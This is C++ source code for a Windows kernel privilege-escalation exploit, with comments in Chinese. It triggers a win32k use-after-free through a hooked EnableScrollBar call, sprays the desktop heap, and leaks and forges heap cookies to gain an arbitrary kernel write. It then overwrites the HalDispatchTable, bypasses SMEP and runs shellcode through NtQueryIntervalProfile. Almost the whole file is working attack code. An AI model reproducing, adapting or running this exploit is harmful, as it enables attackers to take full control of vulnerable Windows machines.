#include <Windows.h>
#include "uaf.h"
#include "spray.h"
#include "assist.h"
#include "kernelLeaks.h"
#include <iostream>
#include <string>
#define SystemModuleInformation (SYSTEM_INFORMATION_CLASS)0xb
VOID findPwndWnd();
HWND fakedpwndWindow = NULL;
HWND hwndVul[hwndCount] = { };	// 含有UAF的句柄
#define uafWnd 0x155
const char g_szClassName[] = "myWindowClassAAAA";
int vulWindow = 0;
PVOID pKernelBase = NULL;
UINT64 test = 0;
PSHAREDINFO pSharedInfo;
MEMORY_BASIC_INFORMATION MemInfo = { 0 };
ULONG_PTR deltaDHeap;
std::string xorKey = { };
PTHRDESKHEAD tagPwndWnd[hwndCount] = {};
PTHRDESKHEAD checkValue[hwndCount] = {};
int pwndWndIndex = 0;
UINT64 recoverAddr = 0;
char faketagWND[0x180] = {};
char getString[0x1b0] = {};
char oldStrBuffer[0x4] = {};
char fakeTagChunk[16] = { 0 };
char fakeHeapChunk[16] = { 0 };
LARGE_UNICODE_STRING oGetString;
BYTE cookies[16] = {};
HWND expHwnd = NULL;
ULONG_PTR nt_HalDispatchTable;
VOID setHeapCookie();
UINT64 changeAddr;
HWND hwndVulA = NULL;
HWND hwndPa = NULL;
BOOL write_what_where(UINT64 what, UINT64 where);
typedef NTSTATUS(__stdcall *NtQueryIntervalProfile_t)(UINT, PULONG);
BOOL  bDoneExploit = FALSE;
NtQueryIntervalProfile_t NtQueryIntervalProfile;
// 此函数相当有用...
typedef NTSTATUS(__stdcall *_NtQueryIntervalProfile)(ULONG ProfileSource, PULONG Interval);
typedef NTSTATUS(WINAPI *_NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);
HWND sprayWindowhh[hwndCount + 0x100];

typedef NTSTATUS(NTAPI* _NtCreateTimer)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, TIMER_TYPE);

VOID GetKernelImageBase()
{
	_NtQuerySystemInformation NtQuerySystemInformation;
	PSYSTEM_MODULE_INFORMATION Modules = {};
	ULONG len;
	// 获取NTQuerySystemInformation的地址

	NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA((LPCSTR)"ntdll"),"NtQuerySystemInformation");
	NTSTATUS ret = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	if (!ret) 
	{
		return ;
	}
	Modules= (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
	NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, Modules, len, &len);

	// 循环遍历 获取kernelimagebaseaddress
	for (int i = 0; i<Modules->Count; i++) 
	{
		if (strstr(Modules->Module[i].ImageName, "ntoskrnl.exe") != 0)
		{
			pKernelBase = Modules->Module[i].Base;
			changeAddr = (UINT64)pKernelBase + 0x3777cc;	// change函数
			recoverAddr = (UINT64)pKernelBase - 0x13cdc;	// 恢复执行
			test = (UINT64)pKernelBase + 0x4c8f75;			// 堆栈平衡函数
		}
	}
	
}
// 获取堆头加密的cookie
BOOL getCookie()
{
	
	BYTE *Addr = (BYTE *)0x1000;
	ULONG_PTR dheap = (ULONG_PTR)pSharedInfo->aheList;

	while (VirtualQuery(Addr, &MemInfo, sizeof(MemInfo)))
	{
		if (MemInfo.Protect = PAGE_READONLY && MemInfo.Type == MEM_MAPPED && MemInfo.State == MEM_COMMIT)
		{
			if (*(UINT *)((BYTE *)MemInfo.BaseAddress + 0x10) == 0xffeeffee) // 说明我们找到了桌面堆的映射...
			{
				if (*(ULONG_PTR *)((BYTE *)MemInfo.BaseAddress + 0x28) == (ULONG_PTR)((BYTE *)MemInfo.BaseAddress + deltaDHeap))	//绕过这个地方相加等于堆
				{
					BYTE* cookieAddr = (BYTE*)MemInfo.BaseAddress + 0x80;
					
					// 自己写一个for循环的来实现复制
					for (int i = 0; i < 0x10; i++)
					{
						cookies[i] = cookieAddr[i];
					}
				
					return TRUE;
				}
			}
		}
		Addr += MemInfo.RegionSize;
	}

	return FALSE;
}

BOOL init_DHInfo()
{
	_TEB64 *_teb = (_TEB64*)NtCurrentTeb();
	deltaDHeap = *(ULONG_PTR *)((BYTE *)(_teb->Win32ClientInfo) + 0x28);	// 得到堆...

	pSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandleA("USER32.dll"), "gSharedInfo");

	if (!pSharedInfo)
		return FALSE;

	if (!getCookie())
		return FALSE;

	return TRUE;
}


ULONG_PTR getHalDispatchtableAddress()
{
	GetKernelImageBase();	// 获取这个kernelbase address
	HMODULE hNtosMod = LoadLibrary("ntoskrnl.exe");
	ULONG lNtHalDispatchTableOffset = (ULONG)GetProcAddress(hNtosMod, "HalDispatchTable") - (ULONG)hNtosMod;
	nt_HalDispatchTable = (ULONG_PTR)pKernelBase + lNtHalDispatchTableOffset + 8;
	return nt_HalDispatchTable;
}

// 调用此函数来进行运行shellocde 进行提权
BOOL runShellcode()
{
	ULONG_PTR newcr4 = 0x406f8;
	NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(GetModuleHandleA((LPCSTR) "ntdll.dll"), "NtQueryIntervalProfile");

	if (!NtQueryIntervalProfile) {
		printf("[-]Failed to get the address of NtQueryIntervalProfile\n");
		exit(1);
	}
	//__debugbreak();
	Sleep(5000);
	if(!write_what_where(changeAddr , nt_HalDispatchTable))  return FALSE; // 可执行
	//__debugbreak();
	Sleep(5000);
	NtQueryIntervalProfile(0x100300, (PULONG)&newcr4);
	//__debugbreak();
	Sleep(5000);
	if(!write_what_where(recoverAddr, nt_HalDispatchTable)) return FALSE; //恢复
}

// 照成out of bounds
VOID prepareExp()
{
	ULONG64 encodeVal = *(ULONG64*)&fakeHeapChunk[8];

	for (int i = 0; i < hwndCount; i++)
	{
		// 用hwndVul来实现堆喷射
		if (sprayWnd_5[i] != NULL)
		{
			SetPropA(sprayWnd_5[i], (LPCSTR)(0x17), (HANDLE)encodeVal);	//1b0
		}
	}
	
	// 这个地方堆头已经修改了 释放或者不释放好像都行?

	//__debugbreak();	// 这一步正确
	findPwndWnd();

}

/*************************************
* 此函数用于向任意地址写入数据
* 
*/

// 需要调用不同的堆来满足功能...
BOOL write_what_where(UINT64 what, UINT64 where)
{
	//__debugbreak();
	// 这个地方得留着..
	CopyMemory(getString + 0x30, (PBYTE)tagPwndWnd[pwndWndIndex], 0x130);	// 堆喷射之后临近的数据默认为此
	*(UINT64*)((PBYTE)(getString)+0x30+0xe0) = where;
	RtlInitLargeUnicodeString(&oGetString, (WCHAR*)getString, (UINT)-1, 0x1b0 - 0x10 - 2);
	
	//__debugbreak();
	Sleep(5000);
	// 喷射堆 执行覆盖buffer指针
	// 这个地方的wnd得改一下...
	for (int i = 0; i < hwndCount; i++)	// 堆喷应该是成功了 但是getString的数据不太对...
	{
		if (sprayWindowhh[i] != NULL)
		{
			NtUserDefSetText(sprayWindowhh[i], &oGetString);
		}
	}

	//__debugbreak();
	// 写入内容
	// 布好局了 但是没什么卵用....
	LARGE_UNICODE_STRING new_objs_lstr;
	CHAR new_objects[0x20] = {};

	*(ULONG64*)new_objects = what;
	
	RtlInitLargeUnicodeString(&new_objs_lstr, (WCHAR*)new_objects, (UINT)-1, 0x20 - 2);
	return NtUserDefSetText(expHwnd, &new_objs_lstr);
	//__debugbreak();
	// 写完之后 
	// 修复指针 释放

}

// 构造数据 实现smep bypass
VOID preSmepBypass()
{
	// SMEP 绕过
	// 写入这个地址 ffffffff`ffd01428
	// 这个地方读写是没有成功么...
	// 在0x100000 的地方分配一块内存
	getHalDispatchtableAddress();
	void * p = (void*)0x100000;
	p = VirtualAlloc(p, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memset(p, 0x41, 0x1000);
	CopyMemory((VOID*)0x100300, shellCode, 0x200);
	UINT64 * x = (UINT64*)(PBYTE(0x100300) + 0x44);
	*(x) = test;
	
}

// 传入句柄地址 然后就可以返回数据了
VOID findPwndWnd()
{
	// 先给他一个机会
	// 这个地方为其设置一个strName
	for (int i = 0; i < hwndCount; i++)
	{
		if (pwndWnd[i] != NULL)
		{
			SetWindowTextA(pwndWnd[i], "AAAAAAAAAAAAAAAAAAAAA");
		}
	}
	for (int i = 0; i < hwndCount; i++)
	{
		if (pwndWnd[i] != NULL)
		{
			tagPwndWnd[i] = (PTHRDESKHEAD)pHmValidateHandle(pwndWnd[i], 1);
		}
	}

	memset(getString, '\x53', 0x1a0);
	CopyMemory(getString+0x30, (PBYTE)tagPwndWnd[4], 0x130);	// 堆喷射之后临近的数据默认为此
	*(UINT64*)((PBYTE)(getString)+0x20) = 0x0;	// 修改previous data
	*(UINT64*)((PBYTE)(getString)+0x28) = *(ULONG64*)(PBYTE(fakeTagChunk) + 8);	// 修复正确的cookie
	*(UINT64*)((PBYTE)(getString)+0x30) = 0x5353535353535353;
	RtlInitLargeUnicodeString(&oGetString, (WCHAR*)getString, (UINT)-1, 0x1b0 - 0x10 - 2);


	// 堆头修复OK
	// 这里可能不具有通用性
	//__debugbreak();
	//Sleep(5000);
	for (int i = 0; i < hwndCount; i++)
		if (zombiepwndPropList[i] != NULL) DestroyWindow(zombiepwndPropList[i]);
	//__debugbreak();
	//Sleep(5000);
	// 这个地方要设置特征字符串...

	//这个地方数据会出错...
	// 喷射覆盖数据.
	for (int i = 0; i < hwndCount+0x100; i++)
	{
		if (sprayWindowhh[i] != NULL)
		{
			NtUserDefSetText(sprayWindowhh[i], &oGetString); //ok
		}
	}
	
	// 之后进行比较.
	for (int i = 0; i < hwndCount; i++)
	{
		if (pwndWnd[i] != NULL)
		{
			checkValue[i] = (PTHRDESKHEAD)pHmValidateHandle(pwndWnd[i], 1);
			
			// 这个地方一定有不同之处
			// 找到
			if (*((UINT64*)checkValue[i]) == 0x5353535353535353)
			{
				pwndWndIndex = i;
			}
		}
	}
	expHwnd = pwndWnd[pwndWndIndex];
	//__debugbreak();
	// 奇怪 这里总有一点点问题...

}

VOID setHeapCookie()
{
	init_DHInfo();	// 获取cookie
	// 这个函数用来设置heapCookie.
	// 使用计算出的cookie.
	// 03 00 01 02 03 00 00 10
	fakeHeapChunk[8] = 0x1B;
	fakeHeapChunk[10] = 0x1;
	fakeHeapChunk[11] = 0x2;
	fakeHeapChunk[12] = 0x3;
	fakeHeapChunk[15] = 0x10;
	fakeHeapChunk[11] = fakeHeapChunk[8] ^ fakeHeapChunk[9] ^ fakeHeapChunk[10];
	
	// 03 00 01 02 03 00 00 10
	//18 00 01 19 03 00 00 10
	fakeTagChunk[8] = 0x18;
	fakeTagChunk[10] = 0x1;
	fakeTagChunk[11] = 0x19;
	fakeTagChunk[12] = 0x3;
	fakeTagChunk[15] = 0x10;
	fakeTagChunk[11] = fakeTagChunk[8] ^ fakeTagChunk[9] ^ fakeTagChunk[10];
	// 直接在这里进行加密吧..
	for (int i = 0; i < 0x10; i++)
	{
		fakeHeapChunk[i] ^= cookies[i];
		fakeTagChunk[i] ^= cookies[i];
	}
	// 得到两个正确的heapCookie.

}



VOID exploit()
{
	//__debugbreak();
	Sleep(5000);
	initWindows(sprayWindowhh, hwndCount + 0x100);
	// 得到两个cookie.
	//__debugbreak();
	Sleep(5000);
	setHeapCookie();	// cookie正确
	//__debugbreak();
	Sleep(5000);
	// 实现_HEAP_ENTRY的out of bouds
	prepareExp();
	//__debugbreak();
	Sleep(5000);
	// 绕过SMEP
	preSmepBypass();
	Sleep(5000);
	//__debugbreak();
	// 执行shellcode
	if(!runShellcode()) return;
	UINT64 oldStrBuf = *(UINT64*)((PBYTE)(tagPwndWnd[pwndWndIndex]) + 0xe0);
	//__debugbreak();
	Sleep(500);
	write_what_where(1, (UINT64)oldStrBuf);
	//__debugbreak();
	Sleep(500);
	bDoneExploit = TRUE;

}
VOID
triggerVul( )
{

	// std::cout << "[+] to the function which we need trigger" << std::endl;00000000001506f8
	// 这里出问题了呀 嘤嘤嘤
	WNDCLASSEXA wc;

	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = DefWindowProcA;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = GetModuleHandleA(NULL);
	wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.lpszMenuName = NULL;
	wc.lpszClassName = g_szClassName;
	wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

	if (!RegisterClassExA(&wc))	// 注册窗口
	{
		if (GetLastError() != ERROR_CLASS_ALREADY_EXISTS)
			return  ;
	}
	hwndPa = CreateWindowExA(
		0,
		g_szClassName,
		0,
		WS_VISIBLE ,
		CW_USEDEFAULT ,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		(HWND)NULL,
		(HMENU)NULL,
		NULL,
		(PVOID)NULL
	);	// 创建窗口

	// 上面创建一个父窗口

	if (hwndPa == NULL) std::cout << "fuck you" << std::endl;
	//for(int i = 0; i < 0x400; i++)
	//	hwndVul[i] = CreateWindowExA(0, "SCROLLBAR", NULL, WS_CHILD | SBS_HORZ | WS_HSCROLL | WS_VSCROLL, 10, 10, 100, 100,hwndPa, HMENU(NULL), NULL, NULL);	// 这个地方HWND不太对
	
	// 填充触发的条件
	//ShowWindow(hwndVul[uafWnd], SW_SHOW);
	//UpdateWindow(hwndVul[uafWnd]);
	sprayObject();

	hwndVulA = CreateWindowExA(0, "SCROLLBAR", NULL, WS_CHILD | SBS_HORZ | WS_HSCROLL | WS_VSCROLL, 10, 10, 100, 100, hwndPa, HMENU(NULL), NULL, NULL);
	
	ShowWindow(hwndVulA, SW_SHOW);
	UpdateWindow(hwndVulA);
	
	// 触发 
	// 此处设置断点调试需要勾取的函数
	// 正确
	hookedFlag = TRUE;
	EnableScrollBar(hwndVulA, SB_CTL | SB_BOTH, ESB_DISABLE_BOTH);   // 触发这个就进去Hook函数里面
	unHook();
	exploit(); // 利用函数
	MSG msg = {};
	while (GetMessage(&msg, NULL, 0, 0))//进入消息循环
	{
		TranslateMessage(&msg);//将虚拟键消息转换为字符消息。字符消息被送到调用线程的消息队列中，在下一次线程调用函数GetMessage或PeekMessage时被读出
		DispatchMessage(&msg); //该函数调度一个消息给窗口程序。通常调度从GetMessage取得的消息。消息被调度到的窗口程序即是MainProc()函数
	}
	return ;
}